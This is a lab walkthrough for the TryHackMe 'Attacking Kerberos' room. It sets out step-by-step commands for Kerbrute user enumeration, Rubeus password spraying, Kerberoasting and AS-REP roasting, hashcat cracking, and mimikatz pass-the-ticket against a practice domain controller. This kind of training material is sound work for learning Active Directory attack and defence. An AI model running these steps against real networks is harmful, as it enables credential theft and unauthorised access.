# Attacking Kerberos

**Room Link:** [https://tryhackme.com/room/attackingkerberos](https://tryhackme.com/room/attackingkerberos)



## Presteps for Lab

### Kerbrute Installation &#x20;

&#x20;Download a precompiled binary for your OS - [https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)

```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute && chmod +x kerbrute 
```

### Impacket Installation &#x20;

```
wget https://github.com/fortra/impacket/archive/refs/tags/impacket_0_9_19.tar.gz
tar xvf impacket_0_9_19.tar.gz 
cd /root/impacket-impacket_0_9_19
pip install .
```

### Download wordlists

```
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.txt
```



### Add hostname to host file

```
echo $VICTIM CONTROLLER.local  >> /etc/hosts
cat /etc/hosts
```

<figure><img src="../../.gitbook/assets/image (2) (8).png" alt=""><figcaption></figcaption></figure>

## Enumeration w/ Kerbrute

This will brute force user accounts from a domain controller using a supplied wordlist

```
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

## Harvesting & Brute-Forcing Tickets w/ Rubeus

Login with provided credentials

**Kali**

```
ssh Administrator@$VICTIM
Password: P@$$W0rd
```

Harvest tickets with Rubeus

**Victim**

```
cd Downloads
Rubeus.exe harvest /interval:30
```

<figure><img src="../../.gitbook/assets/image (3) (9).png" alt=""><figcaption></figcaption></figure>

This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

**Victim**

```
echo $VICTIM CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
cd Downloads
Rubeus.exe brute /password:Password1 /noticket
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

## Kerberoasting w/ Rubeus & Impacket

### Kerberoasting #1 - Rubeus&#x20;

This will dump the Kerberos hash of any kerberoastable users.

**Victim**

```
cd Downloads
Rubeus.exe kerberoast
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Copy the hashes from the command prompt onto the attacker machine and put it into a .txt file so we can crack it with hashcat. Below command removes all the tabs and formats it properly for hashcat. If you don't format it properly than hashcat will error out.

**Kali**

```
cat hashes.txt | sed 's/[[:space:]]//g' |tr -d '\n' | sed 's/$krb5tgs$23$*/\n&/g'  > hash.txt
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

Hashcat found the passwords for both of the hashes.

```
hashcat -m 13100 -a 0 hash.txt Pass.txt --show
```

<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

### Kerberoasting #2  - Impacket

```
sudo python3.9 /root/test/impacket/examples/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.226.108 -request > hashes.txt
```

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

Hashes were found for the same two accounts when doing this with Rubeus.

```
hashcat -m 13100 -a 0 hashes.txt Pass.txt
hashcat -m 13100 -a 0 hashes.txt Pass.txt --show
```

<figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

## AS-REP Roasting w/ Rubeus

**Victim**

```
cd Downloads
Rubeus.exe asreproast
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Kali**

Transfer the hash from the target machine over to kali and put the hash into a txt file. Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User... .The below command does the replace and clean up the output so hashcat can recognize the hashes.

```
cat hashes.txt | sed 's/[[:space:]]//g' |tr -d '\n'| sed 's/$krb5asrep/\n&/g' | sed  's/$krb5asrep/$krb5asrep$23/g'  > hash.txt
hashcat -m 18200 hash.txt Pass.txt
```

Both passwords cracked.

```
hashcat -m 18200 hash.txt Pass.txt --show
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

## Pass the Ticket w/ mimikatz

### Prepare Mimikatz & Dump Tickets

**Victim**

```
cd Downloads
mimikatz.exe
```

**Victim - Mimikatz**

```
privilege::debug
sekurlsa::tickets /export
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### Pass the Ticket w/ Mimikatz

Run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket

**Victim - Mimikatz**

```
kerberos::ptt [0;2b4efc]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Here were just verifying that we successfully impersonated the ticket by listing our cached ticket.

**Victim**

```
klist
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.

**Victim**

```
dir \\$VICTIM\admin$
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
